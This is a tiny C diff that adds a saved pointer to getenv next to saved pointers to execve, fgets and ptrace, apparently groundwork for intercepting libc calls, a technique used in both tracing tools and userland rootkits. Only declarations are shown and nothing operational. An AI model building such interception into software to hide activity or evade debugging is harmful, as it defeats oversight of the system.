@@ -1,6 +1,7 @@
 
 //function pointers to  functions
 
+char *(*old_getenv)(const char *name);
 int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
 char *(*old_fgets)(char *s, int size, FILE *stream);
 long int (*old_ptrace)(enum __ptrace_request request, ...);
